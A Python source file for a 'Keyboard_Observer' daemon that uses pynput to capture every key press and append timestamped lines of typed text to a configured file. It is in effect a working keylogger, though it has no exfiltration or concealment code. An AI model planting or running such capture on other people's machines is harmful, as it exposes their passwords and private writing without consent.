import threading
from datetime import datetime, timezone
from pynput.keyboard import Key, KeyCode, Listener

from src.domain.system_daemon import System_Daemon
from src.domain.config import Config
from src.applications.common.logger_handler import Logger


class Keyboard_Observer(System_Daemon):
    def __init__(self, config: Config, logger: Logger, idle_time_limit: float):
        self._logger: Logger = logger
        self._idle_time_limit = idle_time_limit  # inactivity time for new line
        _file_path = config["FILE_PATH"]
        _extend = config["EXTEND"]
        _information = config["KEYS_INFORMATION"]
        self._path: str = _file_path + _extend + _information
        self._current_line: list[str] = []
        self._last_key_time = datetime.now(timezone.utc)
        self._timer = None
        self._listener: Listener | None = Listener(on_press=self._on_press)
        logger.info("ready")

    def stop(self) -> None:
        self._logger.info("stopping")
        if self._listener != None:
            self._listener.stop()
            self._listener = None
        self._logger.info("Dameon finished")
        

    def restart(self) -> None:
        pass

    def start(self) -> None:
        self._logger.info("starting")
        if self._listener != None:
            self._listener.join()

    def _on_press(self, key: Key | KeyCode | None) -> None:
        self._logger.debug("key: ", key)
        self._last_key_time = datetime.now(timezone.utc)
        if key is None:
            return
        # Teclas alfanuméricas y ESPACIO (tratado como carácter normal)
        if isinstance(key, KeyCode) and key.char is not None:
            self._current_line.append(key.char)
            self._reset_timer()
        # Teclas especiales (ENTER = salto de línea, TAB = tabulación)
        elif isinstance(key, Key):
            if key == Key.space:  # El espacio ahora es un carácter normal
                self._current_line.append(" ")
                self._reset_timer()
            elif key == Key.enter:
                self._current_line.append("\n")
                self._write_to_log()
            elif key == Key.tab:
                self._current_line.append("\t")
                self._reset_timer()
            elif key == Key.esc:
                self._write_to_log(force_newline=True)

    def _write_to_log(self, force_newline: bool = False):
        self._logger.info(f"writing in {self._path}")
        if not self._current_line and not force_newline:
            return  # No hace nada si no hay contenido y no se fuerza
        with open(self._path, "a", encoding="utf-8") as f:
            utc_time = (
                self._last_key_time.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3] + " UTC"
            )
            line_content = (
                "".join(self._current_line) if self._current_line else "[special key]"
            )
            f.write(f"[{utc_time}] {line_content}\n")
        self._current_line = []
        if self._timer is not None:
            self._timer.cancel()
            self._timer = None

    def _reset_timer(self) -> None:
        if self._timer is not None:
            self._timer.cancel()
        timer = threading.Timer(self._idle_time_limit, self._write_to_log)
        timer.start()
        return
